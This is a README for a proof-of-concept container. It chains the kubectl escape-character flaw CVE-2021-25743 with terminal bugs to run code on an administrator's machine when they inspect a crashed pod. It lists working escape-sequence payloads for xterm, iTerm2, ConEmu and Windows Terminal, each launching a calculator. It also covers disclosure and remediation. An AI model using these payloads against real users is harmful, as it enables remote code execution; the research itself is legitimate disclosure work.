# Kubectl escape character handling PoC

This is a proof of concept for [CVE-2021-25743][cve-2021-25743] combined with a
selection of terminal vulnerabilities I found that can achieve remote code
execution across several client platforms (some common, some less so). It is
delivered as a very simple Docker image for ease of testing.

## An imaginary scenario

Container escapes usually need a bug in the container infrastructure, like a
kernel bug or another bug in a subsystem like runc.

If an attacker is unable to abuse those, they may look for more creative means.
This is one such method, it relies on a pod crashing and the administrator
attempting to debug it, while using a terminal with a vulnerability.

In Kubernetes `/dev/termination-log` is world writable within the container and
it's very trivial to crash a container (e.g. run it out of memory). This means
if an attacker finds a way to make an application write to that file and also
DoS an application, they can potentially make the administrator start looking
(to see what the problem is, e.g. prompted by an alert) and in the process of
doing that, the administrator could get attacked, with code execution achieved
on their client machine.

This means the container does not need Kubernetes API access of any kind, a
common way to reduce Kubernetes attack surface is to [turn off the service
account secret][apicred] which is automatically mounted in each pod. The issue
with `/dev/termination-log` is not new, Trail of Bits covered it in their [2019
audit of Kubernetes][2019audit] and a [PR is open][pr108076] to tighten the
permissions.

## Usage

_Only use this on systems you have permission to test._

With kubectl configured with a cluster and namespace you have access to create
pods in, simply:

```
kubectl run --image=davidgl/houdini-kubectl-poc kubectl-poc
sleep 10  # or however long the cluster take to schedule the pod
kubectl describe pod/kubectl-poc
```

The pod deliberately crashes. Manual cleanup is needed; delete the
pod when finished:

```
kubectl delete pod/kubectl-poc
```

## CVEs

This primarily targets Kubectl's CVE-2021-25743. It needs to be combined with a
terminal vulnerability to have any effect though. Some examples are:

- xterm font OSC ([CVE-2022-45063][CVE-2022-45063])

  `"\e]50;i$(xcalc&)\a\e]50;?\a"`

- iTerm2 DECRQSS ([CVE-2022-45872][CVE-2022-45872])

  `"\eP$q;open -a Calculator\r\e\\\eP$q\e\\"`

- ConEmu title ([CVE-2022-46387][CVE-2022-46387])

  `"\e]0;\rcalc.exe\r\e\\\e[21t"`

- Windows Terminal WSL directory ([CVE-2022-44702][CVE-2022-44702])

  `"\e]9;9;/" calc.exe "o /\e\\"`

- Some colour (not a terminal vulnerability, test for CVE-2021-25743 alone)

  `"\e[31mIf you see this in red your kubectl is not fixed against CVE-2021-25743\e[m"`

The list above contains escape sequences in C-style strings, as this section of
the readme is expanded and written to /dev/termination-log, see
[Dockerfile](Dockerfile).

Note the last entry is not a terminal vulnerability, but an attacker could
still use it in an attempt to social engineer the administrator, e.g. change
something else on screen (cursor movement sequences means they can change lines
above where the text is actually output).

## I'm vulnerable, help?

- Update to kubectl of at least 1.26;
- Update your terminal

## Disclosure

All of the terminal bugs were responsibly disclosed to the authors of the
affected software and have now been fixed for several months.

Several of these exploits were shared with the Kubernetes Security team in
advance for awareness, in general the bugs are in terminals, so while Kubectl
should (and now does, at least in this case) escape these characters, the
reason the issues turn out to be severe are because of the more severe bugs in
terminals.

## Credits

- Eviatar Gerzi for [finding the kubectl issue][cyberark-title] originally;
- [G-Research Open Source](https://opensource.gresearch.co.uk/) for letting me research this;
- All the terminal authors for fixing things.

[cve-2021-25743]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-25743
[CVE-2022-45063]: https://www.openwall.com/lists/oss-security/2022/11/10/1
[CVE-2022-45872]: https://nvd.nist.gov/vuln/detail/CVE-2022-45872
[CVE-2022-44702]: https://github.com/microsoft/terminal/releases/tag/v1.15.2874.0
[CVE-2022-46387]: https://gist.github.com/dgl/05ca60cdc7efc9e47bbc58d0c952635e
[pr108076]: https://github.com/kubernetes/kubernetes/pull/108076
[apicred]: https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#opt-out-of-api-credential-automounting
[2019audit]: https://github.com/kubernetes/sig-security/blob/6f1cec8878c705b67982e9b3bf3b52d6f19e17e0/sig-security-external-audit/security-audit-2019/findings/Kubernetes%20Final%20Report.pdf
[cyberark-title]: https://www.cyberark.com/resources/threat-research-blog/dont-trust-this-title-abusing-terminal-emulators-with-ansi-escape-characters
